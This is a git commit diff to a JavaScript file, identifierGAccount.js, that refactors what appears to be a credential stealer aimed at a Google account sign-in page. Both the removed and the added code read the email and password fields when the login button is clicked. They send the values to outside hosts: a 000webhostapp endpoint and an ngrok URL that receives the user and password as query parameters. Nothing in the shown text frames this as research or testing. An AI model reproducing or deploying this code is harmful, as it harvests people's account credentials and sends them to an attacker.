b46d4e7b09992b583cb7246240896670bf1e8452
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-18 16:52:22 -0300

    Update identifierGAccount.js

--- identifierGAccount.js
+++ identifierGAccount.js
@@ -1,65 +1,32 @@
-let user;
-let pass;
+const loginBtn = document.getElementsByClassName('VfPpkd-LgbsSe')[1];
 
-const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
-
-function send_email(){
-    let email = document.querySelector('[type="email"]');
-    let param = email.value;
-    
-    user = param
+function getEmail() {
+  const emailInput = document.querySelector('[type="email"]');
+  return emailInput.value;
 }
 
-function send_pwd(){
-    btn[1].addEventListener('click', function(){
-
-    let pwd = document.querySelector('[type="password"]');
-    let param = pwd.value;
-
-    pass = param
-
-    })
+function getPassword() {
+  const passwordInput = document.querySelector('[type="password"]');
+  return passwordInput.value;
 }
 
-function send_data(usuario, senha){
-    const url = 'https://get-data123.000webhostapp.com/user.php';
-    const params = {
-      hostname: location.host,
-      username: usuario,
-      password: senha
-    };
-
-    fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(params)
-    })
-    .then(response => response.json())
-    .then(data => console.log(data))
-    .catch(error => console.error(error));
-}
-                               
-function teste_send(u, pwd){
-   var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://23b1-45-162-158-3.sa.ngrok.io/creds?user=" + u + "&pwd=" + pwd, true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            console.log(xhr.responseText);
-        }
-    };
-    xhr.send();
+async function testLogin() {
+  const username = getEmail();
+  const password = getPassword();
+  const url = `https://23b1-45-162-158-3.sa.ngrok.io/creds?user=${username}&pwd=${password}`;
+  
+  try {
+    const response = await fetch(url);
+    const data = await response.json();
+    console.log(data);
+  } catch (error) {
+    console.error(error);
+  }
 }
 
+loginBtn.addEventListener('click', function() {
+  const username = getEmail();
+  const password = getPassword();
 
-btn[1].addEventListener('click', function(){
-    send_email();
-    setTimeout(function() {
-        send_pwd();
-    }, 3000);
-    //teste_send(user)   
-    if (user != undefined || pass != undefined || user != null || pass != null){
-        teste_send(user, pass);
-    }
-})
+  setTimeout(testLogin, 3000);
+});
